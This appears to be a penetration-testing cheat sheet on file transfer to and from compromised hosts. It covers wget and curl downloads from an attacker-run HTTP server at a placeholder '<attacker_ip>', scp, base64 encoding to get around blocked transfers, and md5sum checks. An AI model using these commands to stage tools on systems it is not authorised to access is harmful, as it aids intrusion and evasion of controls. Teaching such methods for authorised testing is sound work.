### **Overview**
- File transfers during penetration tests are crucial for uploading tools like enumeration scripts or exploits and downloading data from compromised hosts. 



### **1. Using `wget` or `curl`**
- **Setup**:
    1. Start a Python HTTP server on the attacker's machine:
        ```bash
        python3 -m http.server 8000
        ```
    2. On the target, use either `wget` or `curl` to download the file.
- **Commands**:
    - **Using `wget`**:
        ```bash
        wget http://<attacker_ip>:8000/<file>
        ```
    - **Using `curl`**:
        ```bash
        curl http://<attacker_ip>:8000/<file> -o <output_file>
        ```



### **2. Using SCP**
- **Prerequisites**: SSH credentials for the target system.
- **Command**:
    ```bash
    scp <local_file> <user>@<remote_host>:<remote_path>
    ```
    - Example:
    ```bash
    scp linenum.sh user@remotehost:/tmp/linenum.sh
    ```



### **3. Using Base64 Encoding**
- **Use Case**: When direct file transfer methods are blocked.
- **Steps**:
    1. Encode the file into Base64 on the attackerâ€™s machine:
        ```bash
        base64 <file> -w 0
        ```
    2. Copy the encoded string to the target.
    3. Decode the Base64 string and save it as a file:
        ```bash
        echo <base64_string> | base64 -d > <output_file>
        ```



### **4. Validating File Transfers**
1. **Check File Format**:
    - Use the `file` command on the target:
        ```bash
        file <file>
        ```
2. **Verify Integrity with MD5**:
    - On the attacker's machine:
        ```bash
        md5sum <file>
        ```
    - On the target:
        ```bash
        md5sum <file>
        ```
    - Compare the MD5 hashes to ensure accurate file transfer.



### **Summary of Commands**

|**Tool**|**Command**|**Use Case**|
|---|---|---|
|**Python HTTP**|`python3 -m http.server 8000`|Serve files for download using HTTP.|
|**wget**|`wget http://<attacker_ip>:8000/<file>`|Download file from HTTP server.|
|**curl**|`curl http://<attacker_ip>:8000/<file> -o <output_file>`|Alternative to `wget` for downloads.|
|**scp**|`scp <local_file> <user>@<remote_host>:<remote_path>`|Transfer file via SSH.|
|**Base64**|`base64 <file> -w 0` (encode) and `echo|base64 -d > ` (decode)|
|**Validate**|`file <file>` and `md5sum <file>`|Validate file type and integrity.|
